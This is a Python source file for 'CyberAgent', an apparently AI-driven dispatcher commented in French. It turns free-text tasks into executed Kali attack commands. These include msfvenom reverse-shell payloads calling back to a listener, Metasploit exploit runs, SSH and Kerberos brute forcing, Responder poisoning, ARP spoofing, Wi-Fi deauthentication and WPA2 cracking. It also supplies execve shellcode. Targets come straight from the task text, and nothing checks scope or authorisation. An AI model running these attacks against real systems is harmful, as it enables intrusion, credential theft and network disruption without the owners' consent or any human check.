"""
CyberAgent OSEE — dispatch intelligent vers les outils Kali.
Détecte la catégorie de tâche, sélectionne l'outil, exécute, parse et analyse.
"""
import re
from typing import Optional
from core.agents.base_agent import BaseAgent
from core.tools.terminal import terminal
from core.tools.kali_tools import search_tools, get_tool, get_by_category, catalog_summary, list_interactive_tools
from core.tools.exploit_engine import (
    checksec, rop_gadgets, find_gadget, cyclic, cyclic_find,
    cyclic_64, cyclic_find_64, get_shellcode, encode_xor,
    elf_info, exploit_summary, find_offset,
)

# ── Mots-clés de déclenchement par catégorie ─────────────────────────────────
_TRIGGER_MAP = {
    "recon": [
        "scan", "nmap", "masscan", "rustscan", "port", "ports", "réseau", "network",
        "hôte", "host", "ping", "arp", "netdiscover", "découverte",
        "dns", "dnsenum", "dnsrecon", "fierce", "amass", "sublist3r", "subfinder",
        "sous-domaine", "subdomain", "whois", "theharvester", "osint",
    ],
    "web": [
        "nikto", "gobuster", "dirb", "ffuf", "wfuzz", "dirsearch",
        "web", "http", "https", "répertoire", "directory", "fuzz",
        "sqlmap", "injection", "sql", "wpscan", "wordpress",
        "whatweb", "wafw00f", "vhost", "virtualhost",
        "burp", "burpsuite", "proxy web", "intercepter requête",
        "zap", "zaproxy", "owasp", "scanner web",
    ],
    "passwords": [
        "hydra", "medusa", "hashcat", "john", "brute", "bruteforce", "crack",
        "hash", "password", "mot de passe", "credentials", "crédentiels",
        "crackmapexec", "cme", "evil-winrm", "winrm", "kerbrute", "kerberos",
    ],
    "exploitation": [
        "exploit", "msfvenom", "payload", "reverse shell", "bind shell", "shellcode",
        "metasploit", "msfconsole", "msf", "meterpreter", "searchsploit", "exploitdb",
        "impacket", "secretsdump", "psexec", "wmiexec", "ntlmrelay",
    ],
    "reversing": [
        "gdb", "r2", "radare2", "objdump", "readelf", "nm", "strings",
        "désassemble", "desassemble", "disassemble", "reverse", "re",
        "rop", "gadget", "gadgets", "rop chain", "chaîne rop",
        "binwalk", "checksec", "protections", "mitigations", "pie", "aslr", "nx", "canary",
        "ltrace", "strace", "binaire", "binary", "elf", "pe", "dll",
        "pwndbg", "peda", "gef",
    ],
    "exploit_engine": [
        "cyclic", "pattern", "offset", "cyclic_find", "de bruijn",
        "shellcode", "xor encode", "xor decoder",
        "checksec", "checksec binaire",
        "rop gadget", "ropper", "ropgadget",
        "exploit_summary", "analyse binaire", "analyze binary",
    ],
    "network": [
        "tcpdump", "tshark", "wireshark", "capture",
        "responder", "ntlmv2", "llmnr", "nbt-ns",
        "bettercap", "ettercap", "mitm", "arp spoofing", "arp-spoofing",
        "netcat", "nc", "socat", "ncat",
        "proxy", "proxychains",
    ],
    "wireless": [
        "aircrack", "aircrack-ng", "airodump", "airodump-ng",
        "aireplay", "aireplay-ng", "airmon", "airmon-ng",
        "wifi", "wpa", "wpa2", "wep",
        "handshake", "beacon", "essid", "bssid", "deauth",
        "mode monitor", "monitor mode", "wlan",
    ],
    "forensics": [
        "volatility", "volatility3", "dump mémoire", "memory dump",
        "foremost", "binwalk", "exiftool", "stéganographie", "steganography",
        "steghide", "forensics", "forensique",
    ],
    "smb": [
        "smb", "smbclient", "smbmap", "enum4linux", "rpcclient",
        "active directory", "ad", "ldap", "ntlm", "domain", "domaine",
    ],
}

_ALL_KEYWORDS: dict[str, list[str]] = {}
for cat, kws in _TRIGGER_MAP.items():
    for kw in kws:
        _ALL_KEYWORDS.setdefault(kw, []).append(cat)


class CyberAgent(BaseAgent):
    name = "cyber"
    description = "Expert OSEE — recon, web, passwords, exploitation, reverse engineering, exploit dev, réseau"

    def can_handle(self, task: str) -> bool:
        t = task.lower()
        return any(kw in t for kw in _ALL_KEYWORDS)

    async def run(self, task: str, context: Optional[dict] = None) -> dict:
        t = task.lower().strip()

        # 1. Exploit engine (pas de commande shell)
        if self._is_exploit_engine(t):
            return self._handle_exploit_engine(task)

        # 2. Commande directe (commence par un nom d'outil connu)
        direct_cmd = self._extract_direct_command(task)
        if direct_cmd:
            return self._run_command(direct_cmd, task)

        # 3. Dispatch par catégorie
        category = self._detect_category(t)
        if category == "recon":
            return self._handle_recon(task)
        elif category == "web":
            return self._handle_web(task)
        elif category == "passwords":
            return self._handle_passwords(task)
        elif category == "exploitation":
            return self._handle_exploitation(task)
        elif category == "reversing":
            return self._handle_reversing(task)
        elif category == "network":
            return self._handle_network(task)
        elif category == "forensics":
            return self._handle_forensics(task)
        elif category == "wireless":
            return self._handle_wireless(task)
        elif category == "smb":
            return self._handle_smb(task)

        # 4. Catalogue
        if any(kw in t for kw in ["liste", "list", "catalogue", "quels outils", "what tools", "available"]):
            return self._result(True, catalog_summary())

        return self._result(False, f"Je n'ai pas pu déterminer l'action pour : {task!r}. "
                                   f"Passe par /chat pour que l'IA interprète ta demande.")

    # ── Catégorie détection ───────────────────────────────────────────────────

    def _detect_category(self, task: str) -> Optional[str]:
        scores: dict[str, int] = {}
        for kw, cats in _ALL_KEYWORDS.items():
            if kw in task:
                for cat in cats:
                    scores[cat] = scores.get(cat, 0) + 1
        return max(scores, key=scores.get) if scores else None

    def _is_exploit_engine(self, t: str) -> bool:
        return any(kw in t for kw in [
            "cyclic", "cyclic_find", "checksec", "ropgadget", "ropper",
            "shellcode template", "xor encode", "exploit_summary", "analyse binaire",
            "offset finder", "find offset", "de bruijn",
        ])

    def _extract_direct_command(self, task: str) -> Optional[str]:
        """Si la tâche commence par un outil reconnu, la traite comme commande directe."""
        parts = task.strip().split()
        if not parts:
            return None
        tool = get_tool(parts[0].split("/")[-1])
        if tool:
            if tool.interactive:
                return None  # Pas d'exécution non-interactive
            return task.strip()
        return None

    # ── Exécution générique ───────────────────────────────────────────────────

    def _run_command(self, command: str, original_task: str) -> dict:
        # Détecter le cwd depuis la tâche (ex: "dans /home/user/ctf")
        cwd = self._extract_cwd(original_task)
        result = terminal.run(command, cwd=cwd)

        if result.get("blocked"):
            return self._result(False, f"Bloqué : {result['error']}", {"command": command})

        if result["success"]:
            output = result["stdout"]
            if not output.strip():
                output = result.get("stderr", "") or "(aucune sortie)"
            return self._result(True, output, {"command": command, "returncode": result["returncode"]})

        err = result.get("stderr") or result.get("error", "Erreur inconnue")
        return self._result(False, f"Erreur (exit {result.get('returncode', -1)}):\n{err}",
                            {"command": command})

    def _extract_cwd(self, task: str) -> Optional[str]:
        m = re.search(r"(?:dans|in|cwd|répertoire|directory)\s+(/[\w/\-_.]+)", task)
        return m.group(1) if m else None

    # ── Handlers par catégorie ────────────────────────────────────────────────

    def _handle_recon(self, task: str) -> dict:
        target = self._extract_target(task)
        if not target:
            return self._result(False, "Spécifie une cible (IP, domaine ou plage réseau).",
                                {"hint": "Ex: scan 192.168.1.1 | nmap -sV 10.0.0.1"})

        # Choisir l'outil selon le contexte
        if any(kw in task.lower() for kw in ["dns", "sous-domaine", "subdomain"]):
            cmd = f"dnsrecon -d {target}"
        elif any(kw in task.lower() for kw in ["amass", "passif", "passive"]):
            cmd = f"amass enum -d {target}"
        elif any(kw in task.lower() for kw in ["arp", "local", "réseau local"]):
            cmd = f"arp-scan -l"
        elif any(kw in task.lower() for kw in ["rapide", "fast", "quick"]):
            cmd = f"rustscan -a {target} -- -sV --open"
        elif any(kw in task.lower() for kw in ["tous les ports", "all ports", "-p-"]):
            cmd = f"nmap -sV -sC -p- --open -T4 {target}"
        elif any(kw in task.lower() for kw in ["vuln", "vulnérabilité"]):
            cmd = f"nmap --script vuln -p 80,443,8080,445,22 {target}"
        elif any(kw in task.lower() for kw in ["udp"]):
            cmd = f"nmap -sU --top-ports 100 {target}"
        else:
            cmd = f"nmap -sV -sC --open -T4 {target}"

        return self._run_command(cmd, task)

    def _handle_web(self, task: str) -> dict:
        t = task.lower()

        # Burp Suite
        if any(kw in t for kw in ["burp", "burpsuite"]):
            return self._result(True,
                "Burp Suite — proxy d'interception web :\n"
                "  burpsuite          (lancement GUI)\n\n"
                "Pour des scans automatiques en CLI, utiliser OWASP ZAP :\n"
                "  zaproxy -cmd -quickurl http://<cible> -quickout /tmp/zap.html\n\n"
                "API REST Burp (si activée sur port 1337) :\n"
                "  curl -s 'http://localhost:1337/v0.1/scan' \\\n"
                "       -d '{\"urls\":[\"http://<cible>\"]}'",
                {"tool": "burpsuite"})

        # OWASP ZAP
        if any(kw in t for kw in ["zap", "zaproxy", "owasp"]):
            target = self._extract_url_or_target(task)
            if target:
                if not target.startswith("http"):
                    target = f"http://{target}"
                cmd = f"zaproxy -cmd -quickurl {target} -quickout /tmp/zap_report.html"
                return self._run_command(cmd, task)
            return self._result(False, "Spécifie une URL. Ex: zaproxy http://10.0.0.1")

        target = self._extract_url_or_target(task)
        if not target:
            return self._result(False, "Spécifie une URL cible.",
                                {"hint": "Ex: gobuster dir http://10.0.0.1 | nikto -h http://target"})

        if "sqlmap" in t:
            cmd = f"sqlmap -u '{target}' --dbs --batch"
        elif any(kw in t for kw in ["nikto", "vuln", "vulnérabilité"]):
            cmd = f"nikto -h {target}"
        elif any(kw in t for kw in ["ffuf", "fuzz", "param"]):
            wordlist = "/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt"
            url = target if "FUZZ" in target else f"{target}/FUZZ"
            cmd = f"ffuf -w {wordlist} -u {url} -mc 200,301,302,403"
        elif any(kw in t for kw in ["wpscan", "wordpress", "wp"]):
            cmd = f"wpscan --url {target} --enumerate u,p,t"
        elif any(kw in t for kw in ["whatweb", "fingerprint", "technologie"]):
            cmd = f"whatweb -a 3 {target}"
        else:
            wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            cmd = f"gobuster dir -u {target} -w {wordlist} -t 50 -x php,html,txt,js"

        return self._run_command(cmd, task)

    def _handle_passwords(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        if any(kw in t for kw in ["hashcat", "hash"]):
            # Chercher un hash dans la tâche
            hash_match = re.search(r"([a-fA-F0-9]{32,})", task)
            if hash_match:
                hash_val = hash_match.group(1)
                cmd = f"hashcat -a 0 {hash_val} /usr/share/wordlists/rockyou.txt"
            else:
                return self._result(False, "Fournis le hash à cracker.",
                                    {"hint": "Ex: hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt"})
        elif any(kw in t for kw in ["john"]):
            return self._result(False, "john nécessite un fichier. Ex: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt")
        elif any(kw in t for kw in ["crackmapexec", "cme", "smb"]):
            if not target:
                return self._result(False, "Spécifie une cible pour crackmapexec.")
            cmd = f"crackmapexec smb {target} -u users.txt -p passwords.txt"
        elif any(kw in t for kw in ["kerbrute", "kerberos"]):
            if not target:
                return self._result(False, "Spécifie le DC pour kerbrute.")
            cmd = f"kerbrute userenum --dc {target} -d domain.local /usr/share/seclists/Usernames/Names/names.txt"
        elif any(kw in t for kw in ["hydra", "ssh"]):
            if not target:
                return self._result(False, "Spécifie une cible pour hydra.")
            cmd = f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}"
        else:
            return self._result(False, "Précise l'outil (hydra/hashcat/john/crackmapexec/kerbrute) et la cible.")

        return self._run_command(cmd, task)

    def _handle_exploitation(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        # Metasploit Framework — mode non-interactif
        if any(kw in t for kw in ["metasploit", "msfconsole", "msf"]) and "msfvenom" not in t:
            module_match = re.search(r"(exploit/[\w/]+|auxiliary/[\w/]+|post/[\w/]+)", task)
            lhost = self._extract_ip(task) or "10.10.10.10"
            lport = self._extract_port(task) or "4444"
            rhosts = target or "10.0.0.1"

            if module_match:
                module = module_match.group(1)
                msf_cmds = f"use {module}; set RHOSTS {rhosts}; set LHOST {lhost}; set LPORT {lport}; run; exit"
                cmd = f"msfconsole -q -x '{msf_cmds}'"
                return self._run_command(cmd, task)

            # Listener reverse shell
            if any(kw in t for kw in ["listener", "handler", "écoute", "reverse"]):
                payload = "windows/x64/meterpreter/reverse_tcp" if any(kw in t for kw in ["windows", "win"]) else "linux/x64/shell_reverse_tcp"
                msf_cmds = f"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run; exit"
                cmd = f"msfconsole -q -x '{msf_cmds}'"
                return self._run_command(cmd, task)

            return self._result(True,
                "Metasploit Framework — utilisation non-interactive :\n\n"
                "  msfconsole -q -x 'use <MODULE>; set RHOSTS <IP>; set LHOST <IP>; run; exit'\n\n"
                "Modules courants :\n"
                "  exploit/multi/handler                      → Listener (reverse shell)\n"
                "  exploit/windows/smb/ms17_010_eternalblue   → EternalBlue (MS17-010)\n"
                "  exploit/unix/ftp/vsftpd_234_backdoor       → vsFTPd 2.3.4\n"
                "  exploit/multi/samba/usermap_script         → Samba usermap\n"
                "  auxiliary/scanner/smb/smb_version          → Scan version SMB\n"
                "  auxiliary/scanner/ssh/ssh_login            → Brute force SSH\n"
                "  auxiliary/scanner/portscan/tcp             → Scan de ports\n"
                "  post/multi/recon/local_exploit_suggester   → Suggérer privesc\n\n"
                "Précise le module ou l'action pour lancer directement.",
                {"tool": "msfconsole"})

        if "msfvenom" in t or "payload" in t:
            lhost = self._extract_ip(task) or "10.10.10.10"
            lport = self._extract_port(task) or "4444"
            if any(kw in t for kw in ["windows", "win", "exe"]):
                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/shell.exe"
            elif any(kw in t for kw in ["php"]):
                cmd = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.php"
            elif any(kw in t for kw in ["python", "py"]):
                cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f py -b '\\x00'"
            elif any(kw in t for kw in ["aspx", "asp", "iis"]):
                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o /tmp/shell.aspx"
            elif any(kw in t for kw in ["jar", "java"]):
                cmd = f"msfvenom -p java/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f jar -o /tmp/shell.jar"
            else:
                cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell"
            return self._run_command(cmd, task)

        if "searchsploit" in t:
            term = re.sub(r"searchsploit\s*", "", task, flags=re.IGNORECASE).strip()
            if not term:
                return self._result(False, "Spécifie le terme de recherche. Ex: searchsploit apache 2.4")
            return self._run_command(f"searchsploit {term}", task)

        if any(kw in t for kw in ["impacket", "secretsdump"]):
            return self._result(False,
                "Pour impacket, fournis la commande complète.\n"
                "Ex: impacket-secretsdump domain/user:pass@target\n"
                "Ex: impacket-psexec domain/user:pass@target")

        return self._result(False, "Précise l'action d'exploitation (metasploit/msfvenom/searchsploit/impacket).")

    def _handle_reversing(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        if any(kw in t for kw in ["checksec", "protections", "mitigations", "pie", "nx", "canary"]):
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: checksec ./challenge")
            result = checksec(binary)
            return self._result(True, self._format_checksec(result), {"checksec": result})

        if any(kw in t for kw in ["rop", "gadget", "gadgets"]):
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: rop gadgets ./challenge | gadgets pop rdi ./binary")
            search_term = None
            m = re.search(r"(?:search|grep|cherch\w*)\s+['\"]?(.+?)['\"]?\s*$", t)
            if m:
                search_term = m.group(1)
            result = rop_gadgets(binary, search=search_term)
            if "error" in result:
                return self._result(False, result["error"])
            summary = f"Gadgets trouvés : {result['count']}\n"
            gadgets = result.get("gadgets", [])[:30]
            summary += "\n".join(f"  {g['address']} : {g['instruction']}" for g in gadgets)
            if result['count'] > 30:
                summary += f"\n... (+{result['count'] - 30} gadgets)"
            return self._result(True, summary, result)

        if any(kw in t for kw in ["objdump", "désassemble", "desassemble", "disassemble"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            cmd = f"objdump -d -M intel {binary}"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["strings"]):
            if not binary:
                return self._result(False, "Spécifie le fichier.")
            cmd = f"strings {binary}"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["readelf", "elf info", "sections", "symboles"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            if binary:
                info = elf_info(binary)
                return self._result(True, exploit_summary(binary), {"elf_info": info})

        if any(kw in t for kw in ["strace", "ltrace"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            tool = "strace" if "strace" in t else "ltrace"
            return self._run_command(f"{tool} {binary}", task)

        if any(kw in t for kw in ["analyse", "analyze", "analyse complète"]):
            if binary:
                return self._result(True, exploit_summary(binary))

        return self._result(False, "Précise l'action de reverse (checksec/gadgets/objdump/strings/strace/ltrace).")

    def _handle_network(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        # Responder — lancement direct si interface précisée
        if any(kw in t for kw in ["responder"]):
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+|lo)\b", task)
            if iface:
                mode = "-rdwv" if any(kw in t for kw in ["verbose", "-v"]) else "-rdw"
                cmd = f"responder -I {iface.group(0)} {mode}"
                return self._run_command(cmd, task)
            return self._result(True,
                "Responder — capture de hashes NTLMv2 (LLMNR/NBT-NS poisoning) :\n"
                "  responder -I eth0 -rdwv     (mode actif + verbose)\n"
                "  responder -I eth0 -A         (mode analyse uniquement, sans poison)\n\n"
                "Spécifie l'interface réseau pour lancer directement.\n"
                "Hashes capturés dans /usr/share/responder/logs/",
                {"tool": "responder"})

        # Bettercap — MITM framework
        if any(kw in t for kw in ["bettercap", "mitm", "arp spoofing", "arp-spoofing"]):
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+)\b", task)
            if iface:
                if any(kw in t for kw in ["arp", "spoofing", "mitm", "sniff"]):
                    eval_cmds = "net.probe on; arp.spoof on; net.sniff on"
                    cmd = f"bettercap -iface {iface.group(0)} -eval '{eval_cmds}'"
                else:
                    cmd = f"bettercap -iface {iface.group(0)}"
                return self._run_command(cmd, task)
            return self._result(True,
                "Bettercap — framework MITM réseau :\n"
                "  bettercap -iface eth0\n"
                "  bettercap -iface eth0 -eval 'net.probe on; arp.spoof on; net.sniff on'\n"
                "  bettercap -iface eth0 -caplet arp-spoofing.cap\n\n"
                "Modules utiles en session interactive :\n"
                "  net.probe on          → découverte hôtes\n"
                "  arp.spoof on          → ARP poisoning\n"
                "  net.sniff on          → sniffer trafic\n"
                "  http.proxy on         → proxy HTTP\n"
                "  https.proxy on        → proxy HTTPS (SSLstrip)\n\n"
                "Spécifie l'interface réseau pour lancer directement.",
                {"tool": "bettercap"})

        # Wireshark / tshark
        if any(kw in t for kw in ["wireshark", "tshark"]):
            pcap = self._extract_file_path(task)
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+)\b", task)
            if pcap and "tshark" in t:
                cmd = f"tshark -r {pcap}"
            elif iface and "tshark" in t:
                cmd = f"tshark -i {iface.group(0)} -c 100"
            elif pcap:
                cmd = f"tshark -r {pcap} -Y 'http or dns or ftp'"
            else:
                cmd = f"tshark -i {iface.group(0) if iface else 'eth0'} -c 50"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["tcpdump", "capture"]):
            iface = re.search(r"-i\s+(\w+)", task)
            iface = iface.group(1) if iface else "eth0"
            cmd = f"tcpdump -i {iface} -c 100"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["nc", "netcat", "écoute", "listen"]):
            port = self._extract_port(task) or "4444"
            cmd = f"nc -lvnp {port}"
            return self._run_command(cmd, task)

        return self._result(False, "Précise l'action réseau (tcpdump/responder/bettercap/wireshark/netcat/socat).")

    def _handle_forensics(self, task: str) -> dict:
        t = task.lower()
        file_path = self._extract_file_path(task)

        if any(kw in t for kw in ["volatility", "volatility3", "memory", "mémoire"]):
            if not file_path:
                return self._result(False, "Spécifie le dump mémoire. Ex: volatility3 -f memory.dmp windows.pslist")
            cmd = f"volatility3 -f {file_path} windows.info"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["exiftool", "metadata", "métadonnées"]):
            if not file_path:
                return self._result(False, "Spécifie le fichier.")
            return self._run_command(f"exiftool {file_path}", task)

        if any(kw in t for kw in ["binwalk", "firmware"]):
            if not file_path:
                return self._result(False, "Spécifie le firmware/fichier.")
            return self._run_command(f"binwalk {file_path}", task)

        return self._result(False, "Précise l'outil forensics (volatility3/exiftool/binwalk/foremost).")

    def _handle_wireless(self, task: str) -> dict:
        t = task.lower()
        bssid_match = re.search(r"\b([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})\b", task)
        iface_match = re.search(r"\b(wlan\d+(?:mon)?|mon\d+)\b", task)
        iface = iface_match.group(0) if iface_match else "wlan0mon"

        # airmon-ng — gestion mode monitor
        if any(kw in t for kw in ["airmon", "monitor", "mode monitor", "monitor mode"]):
            raw_iface = re.search(r"\b(wlan\d+)\b", task)
            raw_iface = raw_iface.group(0) if raw_iface else "wlan0"
            if any(kw in t for kw in ["stop", "désactiver", "disable"]):
                cmd = f"airmon-ng stop {raw_iface}mon"
            elif any(kw in t for kw in ["check", "tuer", "kill"]):
                cmd = "airmon-ng check kill"
            else:
                cmd = f"airmon-ng start {raw_iface}"
            return self._run_command(cmd, task)

        # airodump-ng — capture et découverte
        if any(kw in t for kw in ["airodump", "scanner wifi", "découvrir réseau", "capture wifi"]):
            if bssid_match:
                ch_match = re.search(r"(?:canal?|channel|-c)\s+(\d+)", t)
                ch = ch_match.group(1) if ch_match else "6"
                cmd = f"airodump-ng --bssid {bssid_match.group(0)} --channel {ch} --write /tmp/capture {iface}"
            else:
                cmd = f"airodump-ng {iface}"
            return self._run_command(cmd, task)

        # aireplay-ng — injection / deauth
        if any(kw in t for kw in ["aireplay", "deauth", "déauthentification", "injection"]):
            if not bssid_match:
                return self._result(False,
                    "Fournis le BSSID du point d'accès.\n"
                    "Ex: aireplay-ng deauth 10 AA:BB:CC:DD:EE:FF wlan0mon")
            count_match = re.search(r"\b(\d+)\b", t)
            count = count_match.group(1) if count_match and int(count_match.group(1)) < 1000 else "10"
            client_match = re.search(r"-c\s+([0-9a-fA-F:]{17})", task)
            if client_match:
                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} -c {client_match.group(1)} {iface}"
            else:
                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} {iface}"
            return self._run_command(cmd, task)

        # aircrack-ng — cracking handshake
        if any(kw in t for kw in ["aircrack", "crack wifi", "casser wpa", "cracker", "handshake"]):
            cap_file = self._extract_file_path(task) or "/tmp/capture-01.cap"
            wordlist_match = re.search(r"(?:wordlist|dict|dictionnaire)\s+(\S+)", t)
            wordlist = wordlist_match.group(1) if wordlist_match else "/usr/share/wordlists/rockyou.txt"
            if bssid_match:
                cmd = f"aircrack-ng -w {wordlist} -b {bssid_match.group(0)} {cap_file}"
            else:
                cmd = f"aircrack-ng -w {wordlist} {cap_file}"
            return self._run_command(cmd, task)

        # Guide complet workflow Wi-Fi
        return self._result(True,
            "Workflow complet attaque Wi-Fi WPA2 :\n\n"
            "1. Préparer l'interface :\n"
            "   airmon-ng check kill\n"
            "   airmon-ng start wlan0         → crée wlan0mon\n\n"
            "2. Scanner les réseaux :\n"
            "   airodump-ng wlan0mon\n\n"
            "3. Capturer le handshake :\n"
            "   airodump-ng --bssid <BSSID> --channel <CH> --write /tmp/capture wlan0mon\n\n"
            "4. Forcer le handshake (deauth) :\n"
            "   aireplay-ng --deauth 10 -a <BSSID> wlan0mon\n\n"
            "5. Cracker le handshake :\n"
            "   aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap\n\n"
            "Dis-moi quelle étape lancer et avec quel BSSID/interface.",
            {"tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]})

    def _handle_smb(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        if any(kw in t for kw in ["enum4linux"]):
            if not target:
                return self._result(False, "Spécifie la cible.")
            return self._run_command(f"enum4linux -a {target}", task)

        if any(kw in t for kw in ["smbmap"]):
            if not target:
                return self._result(False, "Spécifie la cible.")
            return self._run_command(f"smbmap -H {target}", task)

        return self._result(False, "Précise l'outil SMB (enum4linux/smbmap/smbclient/crackmapexec).")

    # ── Exploit engine (sans shell) ───────────────────────────────────────────

    def _handle_exploit_engine(self, task: str) -> dict:
        t = task.lower()

        # Cyclic pattern
        if "cyclic" in t and "find" not in t:
            m = re.search(r"cyclic\s+(\d+)", t)
            length = int(m.group(1)) if m else 200
            pat = cyclic(length)
            return self._result(True,
                f"Pattern De Bruijn ({length} octets) :\n"
                f"Python  : {repr(pat)}\n"
                f"Hex     : {pat.hex()}\n"
                f"String  : {pat.decode('ascii', errors='replace')}",
                {"length": length, "pattern": pat.hex()})

        # Cyclic find / offset
        if any(kw in t for kw in ["cyclic_find", "find offset", "offset", "cyclic find"]):
            m = re.search(r"0x([0-9a-fA-F]+)", task)
            if not m:
                m2 = re.search(r"\b(\d{8,})\b", task)
                if m2:
                    val = int(m2.group(1))
                else:
                    return self._result(False, "Fournis la valeur crashée. Ex: find offset 0x61616161")
            else:
                val = int(m.group(1), 16)
            arch = "x64" if any(kw in t for kw in ["64", "x64", "rip"]) else "x86"
            result = find_offset(val, arch)
            return self._result(True,
                f"Valeur : {result['value']}\nOffset : {result['offset']}\n{result['note']}",
                result)

        # Checksec
        if "checksec" in t:
            binary = self._extract_file_path(task)
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: checksec ./challenge")
            result = checksec(binary)
            return self._result(True, self._format_checksec(result), {"checksec": result})

        # Shellcode template
        if "shellcode" in t:
            if "x64" in t or "64" in t:
                sc = get_shellcode("linux_x64_execve_sh")
            elif "x86" in t or "32" in t:
                sc = get_shellcode("linux_x86_execve_sh")
            else:
                sc = get_shellcode("linux_x64_execve_sh")
            if "error" in sc:
                return self._result(False, sc["error"])
            return self._result(True,
                f"Shellcode : {sc['description']}\n"
                f"Longueur  : {sc['length']} octets\n"
                f"Python    : sc = {sc['bytes_py']}\n"
                f"Hex       : {sc['hex_escaped']}",
                sc)

        # ROP gadgets via exploit engine
        if any(kw in t for kw in ["ropgadget", "rop gadget", "gadget"]):
            binary = self._extract_file_path(task)
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: ropgadget ./challenge pop rdi")
            search = None
            m = re.search(r"(?:grep|search|cherch\w+|pour)\s+['\"]?(.+?)['\"]?\s*$", t)
            if m:
                search = m.group(1)
            result = rop_gadgets(binary, search=search)
            if "error" in result:
                return self._result(False, result["error"])
            gadgets = result.get("gadgets", [])[:25]
            out = f"Gadgets ROP ({result['count']} trouvés) :\n"
            out += "\n".join(f"  {g['address']} : {g['instruction']}" for g in gadgets)
            return self._result(True, out, result)

        return self._result(False, "Exploit engine : cyclic <N> | find offset <val> | checksec <bin> | shellcode x64 | ropgadget <bin>")

    # ── Helpers d'extraction ──────────────────────────────────────────────────

    def _extract_target(self, task: str) -> Optional[str]:
        # IP
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d+)?)\b", task)
        if m:
            return m.group(1)
        # CIDR range
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+)\b", task)
        if m:
            return m.group(1)
        # Hostname/domaine
        m = re.search(r"\b((?:[a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,})\b", task)
        if m and m.group(1) not in ("et", "de", "du", "un", "le", "la"):
            return m.group(1)
        return None

    def _extract_url_or_target(self, task: str) -> Optional[str]:
        m = re.search(r"(https?://\S+)", task)
        if m:
            return m.group(1).rstrip("/,.")
        return self._extract_target(task)

    def _extract_file_path(self, task: str) -> Optional[str]:
        m = re.search(r"([./][\w/\-_.]+(?:\.(?:elf|exe|bin|out|so|dll|py|txt|dmp))?)", task)
        if m:
            return m.group(1)
        # Juste un nom de fichier sans chemin
        m2 = re.search(r"\b(\w[\w\-_.]+\.(?:elf|exe|bin|out|so|dll|dmp))\b", task)
        if m2:
            return m2.group(1)
        return None

    def _extract_ip(self, task: str) -> Optional[str]:
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", task)
        return m.group(1) if m else None

    def _extract_port(self, task: str) -> Optional[str]:
        m = re.search(r"\b(port\s+|:)(\d{2,5})\b", task, re.IGNORECASE)
        if m:
            return m.group(2)
        m2 = re.search(r"\b(\d{4,5})\b", task)
        return m2.group(1) if m2 else None

    def _format_checksec(self, result: dict) -> str:
        if "error" in result:
            return f"Erreur checksec : {result['error']}"
        lines = [f"Protections de {result.get('binary', 'binaire')} :"]
        icons = {
            "Full RELRO": "✓", "Partial RELRO": "~", "No RELRO": "✗",
            "NX enabled": "✓", "NX disabled": "✗",
            "PIE enabled": "✓", "No PIE": "✗", "PIE disabled": "✗",
            "Canary found": "✓", "No canary": "✗",
        }
        for key in ["NX", "PIE", "Stack", "RELRO", "RUNPATH"]:
            val = result.get(key, "unknown")
            icon = icons.get(val, "?")
            lines.append(f"  {icon} {key:8} : {val}")
        return "\n".join(lines)


cyber_agent = CyberAgent()
